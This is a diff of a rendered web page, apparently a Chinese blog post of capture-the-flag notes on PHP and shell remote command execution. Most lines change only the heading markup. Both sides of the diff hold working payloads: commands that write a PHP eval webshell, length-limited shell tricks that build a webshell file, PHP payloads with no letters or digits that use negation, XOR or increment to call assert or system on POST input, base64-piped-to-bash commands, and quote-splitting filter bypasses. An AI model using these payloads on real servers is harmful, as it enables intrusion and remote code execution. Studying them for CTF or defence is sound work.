+</h6><pre tabindex="0"><code>echo \&lt;?=@eval(\$_POST\[1\]\)\; &gt; 1;mv 1 1.php;jp</code></pre><blockquote>
 <p>echo \&lt;?php&gt;1</p>
 <p>echo eval\(&raquo;1</p>
 <p>echo \$_GET&raquo;1</p>
@@ -390,8 +436,11 @@ echo webshell的base64编码内容 |base64 -d &gt; Web应用目录/test.jsp  </c
 <p>echo \)\;&raquo;1</p>
 <p>mv 1 1.php</p>
 </blockquote>
-<p>########## 7位可控</p>
-<p>知识点</p>
+<h6 id="7位可控" class="heading-element"><span>7位可控</span>
+  <a href="#7%e4%bd%8d%e5%8f%af%e6%8e%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>知识点</p>
 <blockquote>
 <ul>
 <li>&gt; a 虽然没有输入但是会创建a文件</li>
@@ -424,8 +473,11 @@ echo webshell的base64编码内容 |base64 -d &gt; Web应用目录/test.jsp  </c
 &gt;o\ \\
 &gt;ech\\
 ls -t&gt;0
-sh0</code></pre><p>######### 5位可控</p>
-<p>知识点</p>
+sh0</code></pre><h5 id="5位可控" class="heading-element"><span>5位可控</span>
+  <a href="#5%e4%bd%8d%e5%8f%af%e6%8e%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>知识点</p>
 <ol>
 <li>
 <p>输入通配符*，linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p>
@@ -442,8 +494,11 @@ echo 1234&gt;v
 <p>echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</p>
 <p>那么我们只需要将上面的代码拆分倒叙输入到主机即可。我们需要让sh先执行a文件(ls -th&gt;f)就会得到f文件，最后再让sh去执行f文件即可得到1.php。</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271606718.png" alt="image-20230327160653643" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271606718.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271606718.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271606718.png?size=large 2x" data-title="image-20230327160653643" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>######## 反弹shell</p>
-<blockquote>
+<h4 id="反弹shell" class="heading-element"><span>反弹shell</span>
+  <a href="#%e5%8f%8d%e5%bc%b9shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><blockquote>
 <ol>
 <li>
 <p>公网服务器开启监听</p>
@@ -459,24 +514,24 @@ echo 1234&gt;v
 </li>
 </ol>
 </blockquote>
-<h6 id="无回显不出网" class="heading-element"><span>0.0.0.4.3  无回显不出网</span>
+<h2 id="无回显不出网" class="heading-element"><span>无回显不出网</span>
   <a href="#%e6%97%a0%e5%9b%9e%e6%98%be%e4%b8%8d%e5%87%ba%e7%bd%91" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>依旧确认Web应用物理路径，然后写入webshell。</p>
+</h2><p>依旧确认Web应用物理路径，然后写入webshell。</p>
 <p>找web路径的方法和[无回显出网]条件下的第一种方法一样：</p>
 <p><strong>定位Web特殊文件路径并将路径写入当前目录下的txt文件</strong></p>
 <p>有了路径我们就可以直接写webshell</p>
 <p>例如：</p>
-<pre tabindex="0"><code>cmd /c &#34;for /f %i in (&#39;dir /x /s /b index.html&#39;) do (echo%i&gt;%i.path.txt)%26(ipconfig&gt;%i.ipconfig.txt)&#34;</code></pre><h5 id="无字母数字rce" class="heading-element"><span>0.0.0.5  无字母数字rce</span>
+<pre tabindex="0"><code>cmd /c &#34;for /f %i in (&#39;dir /x /s /b index.html&#39;) do (echo%i&gt;%i.path.txt)%26(ipconfig&gt;%i.ipconfig.txt)&#34;</code></pre><h1 id="无字母数字rce" class="heading-element"><span>无字母数字rce</span>
   <a href="#%e6%97%a0%e5%ad%97%e6%af%8d%e6%95%b0%e5%ad%97rce" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="取反" class="heading-element"><span>0.0.0.5.1  取反</span>
+</h1><h2 id="取反" class="heading-element"><span>取反</span>
   <a href="#%e5%8f%96%e5%8f%8d" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>如图示，对phpinfo取反，再取反，仍然得到phpinfo，但是可以利用它进行一些对数字字母过滤的绕过</p>
+</h2><p>如图示，对phpinfo取反，再取反，仍然得到phpinfo，但是可以利用它进行一些对数字字母过滤的绕过</p>
 <p>paylaod: (~%8F%97%8F%96%91%99%90)();</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> 
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">urlencode</span>(<span style="color:#ff636f">~</span><span style="color:#a6be9d">&#39;assert&#39;</span>);
@@ -485,11 +540,11 @@ echo 1234&gt;v
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">urlencode</span>(<span style="color:#ff636f">~</span><span style="color:#a6be9d">&#39;eval($_POST[1]);&#39;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$b</span>;</span></span></code></pre></div><p>shell</p>
 <pre tabindex="0"><code>?cmd=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);</code></pre><pre tabindex="0"><code>?cmd=$_=~%9E%8C%8C%9A%8D%8B;$__=~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4;$_($__);</code></pre><p>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(&lsquo;phpinfo&rsquo;)();来执行函数，第一个括号中可以是任意PHP表达式。</p>
-<h6 id="异或" class="heading-element"><span>0.0.0.5.2  异或</span>
+<h2 id="异或" class="heading-element"><span>异或</span>
   <a href="#%e5%bc%82%e6%88%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCI值，再转换成字符串。</p>
+</h2><p>在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCI值，再转换成字符串。</p>
 <p>这里有一个异或构造的脚本, 相信聪明的你一看就知道怎么回事了</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">valid</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;1234567890!@$%^*()</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">[];</span><span style="color:#a6be9d">\&#39;\&#34;</span><span style="color:#a6be9d">,.&lt;&gt;/?-=_`~ &#34;</span>
 </span></span><span style="display:flex;"><span>
@@ -515,11 +570,11 @@ echo 1234&gt;v
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;!+/((&#34;</span><span style="color:#ff636f">^</span><span style="color:#a6be9d">&#34;~{`{|&#34;</span>;   <span style="color:#828b96;font-style:italic">//构造出_POST
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$$__</span>;   <span style="color:#828b96;font-style:italic">//$___ = $_POST
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span>(<span style="color:#58a1dd">$___</span>[<span style="color:#58a1dd">_</span>]);   <span style="color:#828b96;font-style:italic">//assert($_POST[_]);
-</span></span></span></code></pre></div><pre tabindex="0"><code>${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&amp;%A0=命令或函数  </code></pre><pre tabindex="0"><code>${&#34;`{{{&#34;^&#34;?&lt;&gt;/&#34;}[&#39;+&#39;]();&amp;+=命令   //$_GET[+]</code></pre><h6 id="自增" class="heading-element"><span>0.0.0.5.3  自增</span>
+</span></span></span></code></pre></div><pre tabindex="0"><code>${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&amp;%A0=命令或函数  </code></pre><pre tabindex="0"><code>${&#34;`{{{&#34;^&#34;?&lt;&gt;/&#34;}[&#39;+&#39;]();&amp;+=命令   //$_GET[+]</code></pre><h2 id="自增" class="heading-element"><span>自增</span>
   <a href="#%e8%87%aa%e5%a2%9e" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>个人认为拿到自增的初始值是自增rce最精髓的部分之一</p>
+</h2><p>个人认为拿到自增的初始值是自增rce最精髓的部分之一</p>
 <ul>
 <li>
 <p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为&quot;Array&quot;。再取这个字符串的第一个字母，就可以获得&quot;==A==&quot;。</p>
@@ -605,33 +660,33 @@ echo 1234&gt;v
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">.++</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.++</span><span style="color:#58a1dd">$_</span>;<span style="color:#828b96;font-style:italic">//_POST
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$$_</span>[<span style="color:#58a1dd">_</span>](<span style="color:#58a1dd">$$_</span>[<span style="color:#58a1dd">__</span>]);<span style="color:#828b96;font-style:italic">//$_POST[$_POST[__]] 注意。这里的__也可以替换成%FA这样的特殊字符减少一个字符占用
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
-</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span>(<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">_</span>)[<span style="color:#58a1dd">_</span>];<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;$<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span>$<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">.%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#58a1dd">$_</span>;<span style="color:#58a1dd">$$_</span>[<span style="color:#58a1dd">_</span>](<span style="color:#58a1dd">$$_</span>[<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span>]);<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span><span style="color:#ff636f">&amp;%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">cat</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">flag</span></span></span></code></pre></div><h5 id="命令执行bypass" class="heading-element"><span>0.0.0.6  命令执行bypass</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span>(<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">_</span>)[<span style="color:#58a1dd">_</span>];<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;$<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span>$<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">.%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#58a1dd">$_</span>;<span style="color:#58a1dd">$$_</span>[<span style="color:#58a1dd">_</span>](<span style="color:#58a1dd">$$_</span>[<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span>]);<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span><span style="color:#ff636f">&amp;%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">cat</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">flag</span></span></span></code></pre></div><h1 id="命令执行bypass" class="heading-element"><span>命令执行bypass</span>
   <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8cbypass" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="拼接" class="heading-element"><span>0.0.0.6.1  拼接</span>
+</h1><h2 id="拼接" class="heading-element"><span>拼接</span>
   <a href="#%e6%8b%bc%e6%8e%a5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>a=c;b=at;c=flag;$a$b $c</p>
 </blockquote>
-<h6 id="base64编码" class="heading-element"><span>0.0.0.6.2  base64编码</span>
+<h2 id="base64编码" class="heading-element"><span>base64编码</span>
   <a href="#base64%e7%bc%96%e7%a0%81" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>cat flag  编码为  Y2F0IGZsYWc</p>
+</h2><p>cat flag  编码为  Y2F0IGZsYWc</p>
 <blockquote>
 <p>`echo &ldquo;Y2F0IGZsYWc=&quot;|base64 -d`</p>
 </blockquote>
 <blockquote>
 <p>echo &ldquo;Y2F0IGZsYWc=&quot;|base64 -d|bash</p>
 </blockquote>
-<h6 id="单引号双引号" class="heading-element"><span>0.0.0.6.3  单引号、双引号</span>
+<h2 id="单引号双引号" class="heading-element"><span>单引号、双引号</span>
   <a href="#%e5%8d%95%e5%bc%95%e5%8f%b7%e5%8f%8c%e5%bc%95%e5%8f%b7" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>c&quot;&ldquo;at flag</p>
 </blockquote>
 <blockquote>
@@ -640,18 +695,18 @@ echo 1234&gt;v
 <blockquote>
 <p>c&quot;&ldquo;at fl&rsquo;&lsquo;ag</p>
 </blockquote>
-<h6 id="反斜线" class="heading-element"><span>0.0.0.6.4  反斜线</span>
+<h2 id="反斜线" class="heading-element"><span>反斜线</span>
   <a href="#%e5%8f%8d%e6%96%9c%e7%ba%bf" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
